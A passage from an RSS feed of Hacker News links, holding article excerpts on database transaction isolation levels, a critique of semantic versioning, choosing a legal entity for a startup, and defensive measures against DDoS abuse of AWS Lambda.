<ul><li>Row level: Locks are placed on a single table row</li><li>Table level: Locks are placed on the table</li><li>Page level: This is an intermediary lock (between row and table) and applies to a page – a subset of the table rows, typically, the amount of data that can be read from the disk in a single disk operation.&nbsp;</li><li>Database level: As you can imagine, a&nbsp; lock that applies to the whole database.&nbsp;</li></ul>
<h4>Concurrency:&nbsp;</h4>
<ul><li><a href="https://docs.oracle.com/javadb/10.8.3.0/devguide/cdevconcepts842304.html">Shared locks</a>, also known as read locks. A shared lock on a resource is usually requested when a transaction wants to read data (i.e. select operations). Multiple transactions can acquire shared locks on a resource, meaning that multiple transactions can read data at the same time.</li><li><a href="https://docs.oracle.com/javadb/10.8.3.0/devguide/cdevconcepts842279.html">Exclusive locks</a>, also known as write-locks. An exclusive lock can only be acquired by a single transaction at a time. If there is another transaction who has a lock on the resource (shared or exclusive), the transaction will wait for the other transaction to release the locks. While a transaction holds an exclusive lock, no other transactions can acquire any locks on the resource (shared or exclusive)&nbsp;</li><li><a href="https://docs.oracle.com/javadb/10.8.3.0/devguide/cdevconcepts842385.html">Update locks</a>, are a more relaxed version of the exclusive lock. An update lock can be acquired on an object that has a shared lock on it. When the transaction is ready to update the object, it will convert the update lock into an exclusive lock. Please note that update locks can be acquired an object that has a shared lock on it, but a shared lock cannot be acquired on an object that has an update lock.&nbsp;</li></ul>
<h3>Transaction isolation level</h3>
<p>Transactions make use of these locks to implement different isolation levels. At a really high level, isolation levels are a way to balance concurrency with isolation. The higher the isolation level, the more restrictive locks are going to be, thus the more transactions will have to wait to acquire said locks, which will result in a lower total number of transaction. As they say, there’s no such a thing as a free lunch. These are the transaction isolation levels:</p>
<h4>Read uncommitted</h4>
<p>This is the most relaxed isolation level. It allows the current transaction to read data that hasn’t been committed by other transactions yet. Transactions don’t acquire any locks for resources. This can potentially result in reading that that is in the middle of modified by other transactions.&nbsp;</p>
<h4>Read committed</h4>
<p>The transaction can only read data that has been committed. The transaction acquires shared locks when reading resources and it releases them as soon as the read statement is complete. This means that we are only read data that has completed updating, but since we’re releasing the lock after each instruction, we can get different results on subsequent reads.&nbsp;</p>
<h4>Repeatable reads</h4>
<p>The transaction acquires a shared lock when it wants to read a resource and keeps the locks to the end of the transaction. As we keep shared locks throughout the transaction, we ensure that all reads return the same data, since we are keeping other transactions from modifying the data until the transaction ends.&nbsp;</p>
<h4>Snapshot</h4>
<p><sub>* This is available in SQL Server.&nbsp;</sub></p>
<p>All the reads inside the transaction return the data as it was available at beginning of the transaction. It’s as if the transaction takes a snapshot of the data at the beginning and uses that throughout the transaction. It’s functionally similar to the Serializable level described below, but it makes use of a slightly different mechanism to achieve that.&nbsp;</p>
<h4>Serializable</h4>
<p>This is the highest isolation level available. The transaction acquires read locks for resources that need to be read and keeps them for the duration of the transaction, thus ensuring that data, once read, it stays the same for the duration of the transaction. It also acquires exclusive locks when updating the data and releases them at the end of the transaction. Additionally, the transaction places row range locks on of any rows matching conditions in the current transaction, so that we avoid phantom reads.&nbsp;</p>
<h3>Conclusion</h3>
<p>To summarize, every time you use a transaction in your code, you should take a moment and consider the appropriate isolation level that is needed. You can just put everything as serializable and call it a day, but in most cases, such a strong restriction is not needed and you would only be introducing unnecessary delays into your database. For most cases, a choice between Read Committed and Repeatable Reads would be enough. Keep this table in your mind as it should help you decide. Always use the most relaxed isolation level your app can afford.&nbsp;</p>
<figure><table><tbody><tr><td></td><td><strong>Dirty Reads</strong></td><td><strong>Non-Repeatable Reads</strong></td><td><strong>Phantom Reads</strong></td></tr><tr><td><strong>Read uncommitted</strong></td><td><span>Maybe</span></td><td><span>Maybe</span></td><td><span>Maybe</span></td></tr><tr><td><strong>Read committed</strong></td><td><span>Never</span></td><td><span>Maybe</span></td><td><span>Maybe</span></td></tr><tr><td><strong>Repeatable reads</strong></td><td><span>Never</span></td><td><span>Never</span></td><td><span>Maybe</span></td></tr><tr><td><strong>Snapshot</strong></td><td><span>Never</span></td><td><span>Never</span></td><td><span>Never</span></td></tr><tr><td><strong>Serializable</strong></td><td><span>Never</span></td><td><span>Never</span></td><td><span>Never</span></td></tr></tbody></table></figure>
<h3>Further reading</h3>
<ul><li><a href="https://lanraccoon.com/2020/http-rest-api-cheatsheet/">HTTP – REST API – Cheatsheet</a></li><li><a href="https://lanraccoon.com/2019/jack-of-all-trades-general-programmer/">Jack of all trades – a case for a general programmer</a></li><li><a href="https://lanraccoon.com/2018/async-programming-models-part-1/">Async programming models part I</a></li><li><a href="https://lanraccoon.com/2018/async-programming-part-ii/">Async programming models part II</a></li></ul>


</div></div>]]>
            </description>
            <link>https://lanraccoon.com/2020/learn-about-transaction-isolation-levels/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740921</guid>
            <pubDate>Sun, 05 Jul 2020 18:48:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SemVer Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740913">thread link</a>) | @mikebike
<br/>
July 5, 2020 | https://jolynch.github.io/posts/semver_considered_harmful/ | <a href="https://web.archive.org/web/*/https://jolynch.github.io/posts/semver_considered_harmful/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>In the past ten years or so, <a href="https://semver.org/">Semantic Versioning</a> a.k.a
“SemVer” has become extremely popular in the software development world. The
idea is that libraries and services can convey information to users about how
the application programming interface
(<a href="https://en.wikipedia.org/wiki/Application_programming_interface">API</a>) of
that library/package/service is evolving just using the version number. This
information is conveyed through three dotted numbers that form a logical clock
for totally ordering changes to the software API:</p>

<center><h3>Semantic Version Numbers</h3></center>
<div><pre><code data-lang="text">====================== Specification ========================

Version = &lt;Major&gt;.&lt;Minor&gt;.&lt;Patch&gt;

Major: this number goes up when the public API breaks
Minor: this number goes up when the public API changes
Patch: this number goes up when the public API doesn't change

====================== Examples =============================

# A Minor API change happened, safe to upgrade
1.4.5 -&gt; 1.5.0

# API breakage, probably unsafe to upgrade
1.7.0 -&gt; 2.0.0

# Who knows what will happen
0.182.13 -&gt; 0.182.14
=============================================================</code></pre></div>

<p>Armed with this information, software developers can theoretically upgrade
without fear of the new version breaking their code.</p>



<p>I believe that this versioning scheme, in practice, is problematic and creates
a large amount of pain in our industry. Three concrete failure modes I witness
frequently are:</p>

<ol>
<li>Most packaging systems (deb, rpm, python, ruby, java, etc …) cannot
simultaneously install multiple major versions of the same package name.
This often leaves users unable to upgrade to the latest major version due to
(reasonable) fear of breakages.</li>
<li>Frequent major version bumps frequently break functional code, leading
to <a href="https://en.wikipedia.org/wiki/Dependency_hell">dependency hell</a> where
library/service authors mix and match min, max, and exact version pins on
major versions to try to work around various incompatibilities. These pins
inevitably conflict.</li>
<li>There is still no standard way to derive the source code which produced the
artifact or seeing the difference between two versions. This makes it hard
to verify how the API is breaking or whether it will break specific usage
patterns.</li>
</ol>

<p>There is also the somewhat annoying issue of the plethora of <code>0.X</code> artifacts,
which happen because developers, somewhat reasonably, don’t want to release
a public API they will have to stand behind until they can be certain they
can.</p>

<p>Ultimately these factors lead to software developers, myself included, viewing
dependency upgrades with great trepidation. Quite reasonably developers defend
themselves from breakage by either not upgrading their dependencies (unless
they are forced to), vendoring dependent code, or skipping dependencies all
together and just writing it themselves.</p>

<h2 id="reduce-the-fear-breaking-versions-must-cohabitate">Reduce the Fear: Breaking Versions Must Cohabitate</h2>

<p>The use of the major version number in SemVer to indicate API breakage is by
far the most problematic aspect of the design. In an ideal world, packaging
systems and programming languages would automatically namespace different major
versions, and code that depends on a particular major version would have all
references specifically reference the major version namespace. Unfortunately,
we do not live in an ideal world and most packaging systems simply don’t
support this.  Three examples that I personally struggle with frequently:</p>

<p><strong>Debian packages (<code>apt</code>/<code>aptitude</code> in particular)</strong>: You only get one version
and the higher one is almost always chosen even if that may break less-than
pins. A common practice with debian packages to work around these limitations
is to release new packages with a different name.</p>

<p><strong>Java libraries (<code>mvn</code>/<code>gradle</code> in particular)</strong>: In a given class path you
can only have one implementation of a given package. Even if you manage to
convince gradle or maven to pull down multiple versions of a <code>.jar</code>, good luck
getting the JVM to not pick one implementation arbitrarily. As a result, Java
developers often resort to hacks like
<a href="https://imperceptiblethoughts.com/shadow/">package path rewriting</a>.</p>

<p><strong>Python libraries (<code>pip</code> in particular)</strong>: While the Python community has
moved towards isolated virtual environments which does make this issue slightly
less of an issue (and with tools like <code>docker</code> or
<a href="https://github.com/spotify/dh-virtualenv"><code>dhvirtualenv</code></a> it gets even
better), you still can’t install multiple versions of the same package in the
same virtualenv. Most Python projects I am aware of either don’t work around
this and break all the things, or release multiple package names.</p>

<p>These problems are even worse for client libraries, where the library is wrapping a
remote (often backwards incompatible) API change. For me this has been one of the
hardest parts of upgrading distributed datastores that I work on because we
often can’t use the vanilla client libraries during migration (e.g.
<a href="https://curator.apache.org/">Curator</a> 2 vs Curator 4, Elasticsearch 2 vs 5,
etc …). In my experience with most client library upgrades you have to create
an internal company fork that renames and relocates the package so we can run
both datastore APIs at the same time and have the client gracefully migrate
from the old version to the new one.</p>

<p>In an ideal world, remote APIs would remain backwards compatible for at least a
single major version to give users an upgrade path, but I find that many
developers argue that they don’t need to remain backwards compatible across a
major version (this is what SemVer says after all …). I wish this argument
was soundly rejected.</p>

<p>How can we fix this problem given the current constraints we operate under?
Well, we are left with a reasonably simple option: <strong>put the API version
semantics in the name of the package.</strong> Some example API migrations where I
have been able to take advantage of this technique are:</p>

<ul>
<li><code>boto</code> to <code>boto3</code> (Python,
<a href="https://boto3.amazonaws.com/v1/documentation/api/latest/index.html">docs</a>):
An extremely prevalent library for accessing AWS services</li>
<li><code>elasticsearch</code> to <code>elasticsearch2</code> (Python, <a href="https://github.com/elastic/elasticsearch-py/issues/515">motivation</a>): A Python client library for the
Elasticsearch search engine.</li>
<li>Every Linux kernel package ever (the Linux kernel has this figured out!). The
Kernel not only prohibits breaking user-space, but they give their users a
great way to install multiple kernels at the same time.</li>
<li>Cassandra’s Thrift API
(<a href="https://github.com/Netflix/Astyanax">Netflix Astyanax</a>)
to Cassandra’s CQL API
(<a href="https://github.com/datastax/java-driver">Datastax Java Driver</a>): The client
drivers for the Cassandra database.</li>
</ul>

<h2 id="reduce-the-fear-binary-versions-can-be-traced-to-source">Reduce the Fear: Binary Versions Can be Traced to Source</h2>

<p>In my experience, software engineers spend a non trivial amount of time trying
to figure out “what actually changed between these two released versions”. One
of the explicit goals of <code>SemVer</code> was to help developers reason about change.
As a developer myself I accidentally break things in minor versions all the
time, so I understand that this can happen. I don’t mind the breakage as much
as being unable to debug what broke, since projects use many different ways of
relating released versions to code.</p>

<p>Some projects do use <a href="https://git-scm.com/book/en/v2/Git-Basics-Tagging">git
tags</a> to achieve this
auditability, but this isn’t mandatory so some (many?) projects don’t do it.
The commit id may, in some cases, be a better identifier since the commit id
must exist and <code>git</code> has a really easy way to view <a href="https://git-scm.com/docs/git-diff">changes between two
commits</a>. In fact, as far as I know, the
commit id is always easily comparable in practically every source control
system.</p>

<p><a href="https://en.wikipedia.org/wiki/Changelog">Changelogs</a> are also <em>nice</em>, but
while I can typically assume projects use source control since it is strictly
easier than not using source control, I don’t think it is reasonable to expect
developers, often working for free, to take the time to summarize their
software changes into English changelogs. Writing clear and actionable English
is difficult, potentially more difficult than the code itself. Certainly, I
appreciate every project maintainer who takes the time to summarize changes in
a release, but I don’t think it’s fair to <em>expect</em> it in the same way most
consumers of software expect producers to use source control.</p>



<p>Both of these problems can be remedied with a straightforward evolution to
<code>SemVer</code> in which we make some small changes to include a great deal more
semantic information in the package name and version number. I call it
semantic package names and it consists of two changes:</p>

<ol>
<li>Use package (=module) names to indicate an API has broken, not versions.</li>
<li>Attempt to include a source identifier in the version.</li>
</ol>

<p>For example, <code>elasicsearch5</code> is the python library that functions with the
Elasticsearch server version 5.  Applications such as Elasticsearch or
Cassandra release named packages that unambiguously communicate the major
version API that is supported by that package. One possible example for Apache
Cassandra might be <code>cassandra-21x</code>, <code>cassandra-30x</code>, <code>cassandra-311x</code>, and
<code>cassandra-40x</code> for the <code>2.1</code>, <code>3.0</code>, <code>3.11</code>, <code>4.0</code> branches respectively.</p>

<p>I know this is not new, many software projects already follow this kind of scheme
such as the Linux kernel (a.k.a “Never break userspace”) or the Go
<a href="https://golang.org/cmd/go/#hdr-Module_compatibility_and_semantic_versioning">programming language</a>.
I just believe that if every software project and language I interacted with
followed this pattern the whole industry would become more efficient and spend
less time fearing dependency updates. I have also found myself using this
technique internally to every company I’ve worked at to manage software change.</p>

<p>In addition to using semantic package names, I prefer when packages include a
fourth piece of metadata in their version number indicating the source version
that produced the artifact. Depending on the packaging system this is usually
either another dotted version (making it a four-tuple) or a <code>-</code> suffix.</p>

<center><h3> Better Semantic Versioning </h3></center>

<div><pre><code data-lang="text">====================== Specification ========================
&lt;Package Version&gt; = &lt;Package Name&gt;:&lt;Version Number&gt;
&lt;Version Number&gt;  = &lt;Major&gt;.&lt;Minor&gt;.&lt;Patch&gt;&lt;Identifier&gt;

Package Name: This name changes when the public API breaks
Major: this number goes up with "major" public API additions
Minor: this number goes up with "minor" public API additions
Patch: this number goes up on every release
Identifier: For packaging systems that support it, this
            string relates directly to a specific source
            code that produced the artifact.

An example of an identifier in git would be the first 8</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jolynch.github.io/posts/semver_considered_harmful/">https://jolynch.github.io/posts/semver_considered_harmful/</a></em></p>]]>
            </description>
            <link>https://jolynch.github.io/posts/semver_considered_harmful/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740913</guid>
            <pubDate>Sun, 05 Jul 2020 18:47:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to start a company without losing all your favorite stuff]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740752">thread link</a>) | @RobbieStats
<br/>
July 5, 2020 | https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html | <a href="https://web.archive.org/web/*/https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <div>
  <div>
    <div>
      <div>
        <p>
          <span>June 24, 2020</span>
          /
          <span>
            by Andrew Fisher
          </span>
        </p>
        <h3><a href="https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html">How to start a company...without maybe losing all your favorite stuff</a></h3>
        <p><em>The TL;DR (“too long, didn’t read”) version: Corporations and LLCs are the best choice for almost all new businesses, and Startomatic can get yours formed with no guesswork and no headaches.</em></p>

<p><strong>Most founders</strong> have some idea of the variety of legal forms that they have to choose from when creating their new company. Who hasn’t heard of a corporation or a limited liability company (LLC)?</p>
<p>Only slightly less recognizable are entities like general partnerships (GPs), limited partnerships (LP’s) , sole proprietorships, and non-profit corporations.</p>
<p>And what about those more “exotic” choices - professional corporations (PCs), professional limited liability companies (PLLCs), and even <em>limited liability limited partnerships</em> (LLLPs) (holy cow)??</p>
<p>As if that’s not enough, where do “C-corporations” and “S-corporations” fit into all of this? Well… they don’t, really. But more on that later…&nbsp;</p>
<p>So any business founder has the right to be confused about choosing an entity type, and it’s no wonder so many feel the safe option is to seek out a business lawyer for solid advice. At Startomatic, we agree that lawyers can be <em>extremely </em>helpful in setting up many types of businesses with large or complex ownership bases, or those that are going to take in professional investment money (think venture capital investments in preferred stock) right after forming.&nbsp;</p>
<p>But <strong>for companies with just a few owners</strong> (somewhere south of 6-8) and a straightforward initial capital structure (all owners get the same type of equity), the best advice is <strong>KISS - Keep It Simple, Startups</strong>.&nbsp;</p>
<p><strong>THE AWESOMENESS OF LIMITED LIABILITY&nbsp;</strong></p>
<p>Your first question might be “why do I need an entity at all (and what the heck is an ‘entity’ anyway)?”&nbsp;</p>
<p><em>Entity </em>is the catch-all term lawyers use to describe corporations, LLCs, and all of the other types of legal business forms described above.&nbsp;&nbsp;</p>
<p>And the best reason for running your business as an entity? It’s because you probably like your car, and your house, and your priceless collection of Pink Floyd on vinyl. If you run your business as an entity, all of those items of personal property are off limits if your new business fails and owes your creditors (landlord, material suppliers, contractors) money. Without an entity between you and your business’s creditors, those creditors can sue you personally and take your records AND your record player.&nbsp;</p>
<p>But if your company is a corporation, LLC or other entity with the legal protection of <strong>limited liability</strong>, those creditors can only go after the assets of the company (in most cases). Your classic Camaro is safe.</p>
<p>Using an entity to run your company has some other benefits as well - it can be easier to get business banking services, buy (or be bought by) another company, and enter into contacts. But the number one reason is the beauty and safety of<em> limited liability</em>.&nbsp;</p>
<p><strong>CORPORATIONS - THE GRANDDADDY OF BUSINESS ENTITIES&nbsp;</strong></p>
<p>Cast your mind way back, so far back that avocado toast wasn’t even a thing yet, and you’ll get to the 1790s. That’s when corporations took off in the U.S., and there’s a reason they’re still the dominant business form for most companies, particularly large ones: <em>there’s no mystery about how corporations work</em>.&nbsp;</p>
<p>Every corporation is owned by its <em>shareholders </em>(or stockholders; the terms are interchangeable), managed by one or more <em>directors </em>(the “Board of Directors” or sometimes just the “Board”), and operated by its <em>officers </em>(President, Secretary, etc.)&nbsp;</p>
<p>For this reason, professional investors (think: venture capitalists) tend to prefer investing in corporations. It’s also possible to grant employees stock options (the ability to buy stock in the corporation in the future) to encourage them to do their best work and to stick around. Stock options just don’t work well in LLCs, for a number of reasons that are WAY too boring to go into here.&nbsp;</p>
<p>On the flip side, the well-defined structure of a corporation makes them less flexible and means there are more corporate “housekeeping” matters to occupy your precious business time and attention. And as always, taxes come into play: a corporation’s earnings may be taxed twice (yikes!), once at the corporation level, and again when earnings are distributed to the shareholders. (But see the discussion on S-corporations, below.)&nbsp;</p>
<p>Here’s the skinny on corporations:</p>
<p><strong>PROS of a Corporation:</strong></p>
<ul><li>Limited liability</li><li>Professional investors generally prefer corporations&nbsp;</li><li>Easy to issue equity incentives (stock or stock options) to employees and others</li></ul>
<p><strong>CONS of a Corporation:&nbsp;</strong></p>
<ul><li>Double taxation (without an S-election; see below)&nbsp;</li><li>Limited flexibility in management&nbsp;</li><li>Generally more complex to manage than an LLC&nbsp;</li></ul>
<p><strong>LLCS - THE CORPORATION’S YOUNGER, WILDER SIBLING&nbsp;</strong></p>
<p>Corporations were almost 200 years old when the limited liability company came onto the business scene in the 1990’s. LLCs are basically state-approved contracts creating companies with the key benefit of limited liability (hence their creative naming) but much more flexibility in management and ownership structure than corporations.&nbsp;</p>
<p>LLCs are owned by their <em>members </em>and are managed either directly by those members or by <em>managers</em>. If compared to corporations, members are similar to shareholders, and managers are like a combination of directors and officers.&nbsp;</p>
<p>The LLC’s major difference from corporations is that the contract governing the LLC (usually called an Operating Agreement or an LLC Agreement) can say pretty much whatever the owners want it to say. So the financial terms of investment, tax allocations, and cash distributions, as well as who makes the management decisions in the company, can be anything the members (owners) agree to.</p>
<p>Perhaps most beneficially, LLCs are usually subject to <strong>pass-through taxation </strong>by the IRS, which means the company’s profits (and losses) are “passed through” directly to the owners - avoiding the corporation’s double taxation issue described above. This is the same way partnerships are taxed.&nbsp;</p>
<p>While the LLC’s flexibility is appealing to some, it has the drawbacks of being unattractive to many investors, and making it so awkward to issue incentive compensation (stock options) that it’s generally not even worth trying.</p>
<p><strong>PROS of an LLC:</strong></p>
<ul><li>Limited liability, just like a corporation&nbsp;</li><li>Single level of taxation usually means tax savings&nbsp;</li><li>Flexibility in financial and management means the owners can decide exactly how they want the business to run&nbsp;</li><li>Fewer time-sucking administrative requirements than corporations</li></ul>
<p><strong>CONS of an LLC:&nbsp;</strong></p>
<ul><li>Professional investors generally prefer corporations&nbsp;</li><li>Nearly impossible to issue equity incentives to employees and others&nbsp;</li></ul>
<p><strong>TAXES ALWAYS COMPLICATE THINGS: THE S-ELECTION&nbsp;</strong></p>
<p>The<em> double taxation</em> problem of corporations does have a solution - but it’s one that comes with significant limitations (of course, darn that IRS…)&nbsp;</p>
<p>An<em> S-corporation</em> isn’t actually a <em>type </em>of corporation at all; it’s just a description of a corporation that has elected with the IRS to be taxed like a partnership. By making this election, the corporation doesn’t pay taxes on its income; instead, the shareholders report and pay taxes on the company’s earnings (and can take the losses) directly on their own tax returns. This is “pass-through” taxation, just like the default taxation of an LLC.&nbsp;</p>
<p>So what are the limits on an S-corporation? They’re pretty significant. An S-corporation:&nbsp;</p>
<ul><li>Can have no more than 100 shareholders&nbsp;</li><li>Can have only one class of stock (so no preferred stock, which is what outside investors usually want)&nbsp;</li><li>Can only have shareholders who are individuals (so no companies can be shareholders, again meaning many investors are shut out)&nbsp;</li><li>All shareholders must be U.S. citizens or lawful permanent residents&nbsp;</li></ul>
<p><em>OK, but then what’s a C-corporation?</em> Easy. It’s just a corporation that has not made an S-election.&nbsp;</p>
<p><strong>Should your <u>corporation </u>make an S-election?&nbsp;</strong></p>
<p><em>Probably yes</em>, if BOTH of the following are true: (a) you meet all of the basic requirements described in the section above, and (b) you don’t intend to raise funds from outside investors in the near term. Keep in mind that you can always change from an S-corporation to a C-corporation in the future - you just have to make a filing with the IRS (and of course there are a few <a href="https://www.irs.gov/forms-pubs/revoking-a-subchapter-s-election" target="_blank">restrictions</a>).&nbsp;</p>
<p><strong>Should your <u>LLC </u>make an S-election?&nbsp;</strong></p>
<p><em>Wait, so an LLC can make an s-election, and choose to be taxed like an S-corporation??</em> We hear you, this is confusing. For now, suffice it to say that there are some very specific circumstances in which an LLC might choose S-corporation taxation - and Startomatic supports that option - but generally speaking LLCs are better off without an S-election. We’ll blog more about this soon and link to it here when we do.</p>
<p><strong>HOW TO CHOOSE: CORPORATION OR LLC&nbsp;</strong></p>
<p>If you’re still unsure, take a look again at the lists of pros and cons above under the corporation and LLC sections. If you meet criteria for either entity and see benefits in each, in our experience the LLC offers more flexibility with less administrative headaches than a corporation, plus the automatic benefit of pass-through taxation, so it’s generally the right choice for new small businesses.&nbsp;&nbsp;</p>
<p><strong>SOLE PROPRIETORSHIPS ARE EASY… AND RISKY&nbsp;</strong></p>
<p>A quick note about <em>sole proprietorships</em>, which you may have heard of. A sole proprietorship is just running your business without an entity. It’s easy, fast, and usually free, but it’s missing the key benefit of limited liability (your classic Camaro isn’t safe any more), and for this reason it’s usually not a good choice.&nbsp;</p>
<p>That said, there are few businesses where the risk is so low that using a sole proprietorship may be a reasonable choice in order to save on filing fees and administrative work of setting up and operating an entity. For that reason, Startomatic will begin offering sole proprietorships in the near future - stay tuned.&nbsp;</p>
<p><strong>S…</strong></p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html">https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html</a></em></p>]]>
            </description>
            <link>https://startomatic.com/blog/2020/06/24/how-to-start-a-company-without-maybe-losing-all-your-favorite-stuff-4.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740752</guid>
            <pubDate>Sun, 05 Jul 2020 18:26:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Lambda Abuse]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740734">thread link</a>) | @luminousmen
<br/>
July 5, 2020 | https://luminousmen.com/post/aws-lambda-abuse | <a href="https://web.archive.org/web/*/https://luminousmen.com/post/aws-lambda-abuse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>I have already written quite a lot about the <a href="https://luminousmen.com/post/how-to-start-your-blog-for-20-cents">serverless approach</a>, the AWS Lambda service in particular, and how I use it for my own personal purposes. In this post, we will walk once again through how AWS Lambda set up and running. We will talk about strategies to mitigate the impact of DDoS attacks (the days of DoS are long gone) and create fail-safe serverless applications. There is very little information on this topic, although it is quite important and most common when discussing AWS security.</p>
<p>P.S. Unfortunately, this post has not been sponsored.</p>
<hr>
<p>Briefly about AWS Lambda. AWS Lambda is an AWS computing service that allows us to run simple functions as FaaS in the cloud. AWS Lambda performs all administration for us, including server and operating system maintenance, resource allocation, automatic scaling, monitoring, and logging. All you have to do is provide code in one of the languages that AWS Lambda supports.</p>
<p>Advantages of using the AWS Lambda:</p>
<ul>
<li><strong>Cost-effective</strong>. You only pay when the service is running(but some services cost a lot).</li>
<li><strong>No ops</strong>. You do not need to manage anything yourself. AWS takes care of the operating system, deployment, scaling, and so on.</li>
<li><strong>Speed</strong>. The lambda itself goes up and runs very fast(but there are overhead on spinning up the runtime).</li>
<li><strong>Scalability</strong>. Functions can be run in parallel with limit depending on the region, from 1000 to 3000 copies maximum. And if you want, this limit can be increased.</li>
</ul>
<p>The work of AWS Lambda is quite simple and clear. The first time a function is called, an instance of a custom function is created, the runtime is created which passes on queries and answers between AWS Lambda and the function code. The function handler is started to handle the event. The source of the event(called trigger) can be a wide variety of things inside the AWS, the most popular triggers for the web I would call AWS CloudFront, AWS API Gateway, and AWS SQS. When the function has processed an event it returns a response and remains active — it waits for the next events to be passed. As more events arrive, the internal AWS Lambda schedulers direct them to the warm(already running) instances if there is one and create new instances as needed. When the number of requests decreases, AWS Lambda stops unused instances to free up the resources for other functions.</p>
<p>The number of instances of functions that serve requests at a given time is called <em>concurrency</em>. And this is essentially horizontal scalability inside the AWS Lambda. When requests arrive faster than your function can scale, or when your function is on the maximum concurrent level, the additional requests fail with the 429 status (too many requests).</p>
<p>In terms of security, each function of AWS Lambda works in its own isolated environment, with its own resources and file system. It stores code on an Amazon S3 and encrypts it at rest.</p>
<p>When you deploy an endpoint that is open to the world, you open it not only for use but also for abuse.</p>
<h2>DDoS 101</h2>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/aws-lambda-abuse/aws-lambda-abuse-2.JPG" alt="DDoS"></p>
<p>Imagine someone who wants to disrupt the bus system. Thousands of people get on the bus at the beginning of the route and ride aimlessly through the city from end to end without leaving at the stops. The transport keeps going, but in fact, the traffic is paralyzed. People are standing at intermediate stops and are sadly watching the crowded buses without being able to push through. People are unable to get home, and the bus company is suffering losses due to low passenger traffic.</p>
<p>This is easy to apply for web applications — basically, an attacker is trying to overload some component of the system to bring it to some critical point after which there will be a system failure, it can be a communication channel, a queue of requests or just an overload of the system handler.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/aws-lambda-abuse/aws-lambda-abuse-3.JPG" alt="DNS DDoS"></p>
<p>Probably the most popular DDoS attack because of its cheapness and difficulty to block it is DNS (Domain Name Server) DDoS. In the DNS DDoS, the attacker tries to overwhelm the capacity of the target's DNS name servers in an attempt to prevent the name server query resolution. Blocking DNS makes the target application or website unavailable to users even if the rest of the infrastructure is running normally. Going back to the bus system analogy, imagine that the buses are running on schedule, they are empty and everything seems fine, but the bus doors just don't open — people just can't get in.</p>
<p>In AWS it is a bit more complicated because, as it has already been said, both management and scaling take place on the AWS side, and therefore control.</p>
<h2>AWS Lambda at scale</h2>
<p>AWS provides services and mechanisms to avoid common abuse methods but often, as with typical DDoS attacks, it doesn't know what traffic is and isn't abusive.</p>
<p>AWS itself is incredibly huge and has many regions, availability zones, and edge locations, which allows to eliminate bad traffic to some extent and absorbs the rest. But it is not enough just to use the lambda function thinking that AWS will do everything for you automatically. You can of course, but in the end, you can get either a broken service or a huge bill or all at once. AWS imposes limits on the number of concurrent handlers, you have to think about where the traffic is coming from, how DNS resolves, and if you use any external AWS services it sometimes makes sense to migrate them all inside AWS for more complete control. Services such as AWS Route53 and AWS CloudFront which allow you to take advantage of the variety of internal AWS infrastructure — which itself is built quite interestingly.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/aws-lambda-abuse-1.JPG" alt="AWS"></p>
<p>I tried to illustrate an example of incoming traffic to lambda service located in one region. As you can see, there are many steps before you get to the lambda itself. It all starts with a DNS resolution of a record on one of the name servers in AWS Route53(this is the service that is responsible for name resolution and stuff) that is intentionally hosted on the edge locations so that clients from different networks and locations have their own quick way to the service while having more than one path in case of localized outages. Also, there is AWS CloudFront (you can use Lambda@Edge option in lambda) on the edge locations — it is a content delivery network for delivery of all static and dynamic content, which allows users not to go directly to the function if it is not necessary. So Route 53 can assign different users to the closest AWS CloudFront instances (which can already be in the same edge location) which can already have the necessary content. Sounds great, right?</p>
<p>An example of how it works step by step:</p>
<ul>
<li>When the request is sent by the user, the DNS resolves at the user's closest edge location where AWS Route 53 is located.</li>
<li>Route 53 forwards the request to the nearest edge location where AWS CloudFront is located.</li>
<li>Then, there can be two possibilities i.e. whether files requested are in cache or not. If files are in the cache then CloudFront returns them.</li>
<li>CloudFront compares the specifications in your distribution with the request. Then trigger the AWS Lambda function with the user request.</li>
<li>The origin server sends the requested files to the CloudFront edge location.</li>
<li>When the first byte of the requested files arrives, CloudFront starts sending the files to the user.</li>
<li>It also saves the files to the internal cache of CloudFront(for specified TTL) so they could be accessed easily in the future if the same or another user requests them.</li>
</ul>
<p>You can of course use the API Gateway in an edge-optimized mode in front of your API for about the same purposes (caching and function trigger). However, this is likely to be more expensive, the API Gateway charges for the size of the cache per hour, CloudFront charges per request, and data transfer. But of course, everything depends on the specific architecture, purpose and workload.</p>
<p>The API Gateway is essentially a proxy server that the user is accessing, and this proxy server is calling the lambda. Typically, the API Gateway can also do SSL certificate processing, load balancing, authorization and authentication, caching, request content compression. But it's not that effective under abuse as CloudFront.</p>
<h2>How to mitigate the impact</h2>
<p>As always, this requires a multi-level approach and everything depends very much on the specific architecture, the workflow, and of course the budget.</p>
<h3>Check your code</h3>
